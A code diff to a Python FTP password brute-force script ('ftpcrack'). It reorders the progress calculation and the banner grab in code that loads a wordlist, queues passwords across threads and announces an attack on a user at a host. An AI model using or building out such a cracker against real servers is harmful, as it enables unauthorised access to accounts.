@@ -54,7 +54,8 @@ def ftpcrack(threadName, q):
 						if len(password) < 25:
 							add = 25 - int(len(password))
 							password = str(password) + " " * add
-							progdone = len(passwords) - workQueue.qsize()
+						
+						progdone = len(passwords) - workQueue.qsize()
 						percent = round(float(100.00) / len(passwords) * progdone,2)
 						token = time.time() - startcnt
 						eta = round(token / progdone * len(passwords) - token,2)
@@ -106,11 +107,15 @@ passwords = [line.strip() for line in open(args.wordlist, 'r')]
 user = args.user
 host = args.ip
 
-print " [*] Loading " + str(len(passwords)) + " passwords to try.."
-
 if not passwords or not user or not host:
 	parser.print_help()
 	exit()
+
+print " [*] Loading " + str(len(passwords)) + " passwords to try.."
+connection = FTP(host, timeout=2)
+wlcmsg = connection.getwelcome()
+print wlcmsg
+print
 
 workQueue = Queue.Queue(len(passwords))
 
@@ -127,10 +132,6 @@ for passw in passwords:
 
 startcnt = time.time()
 print " [*] Starting attack on " + str(user) + "@" + str(host) + " with " + str(maxthreads) + " threads."
-print
-connection = FTP(host, timeout=2)
-wlcmsg = connection.getwelcome()
-print wlcmsg
 print
 queueLock.release()
 
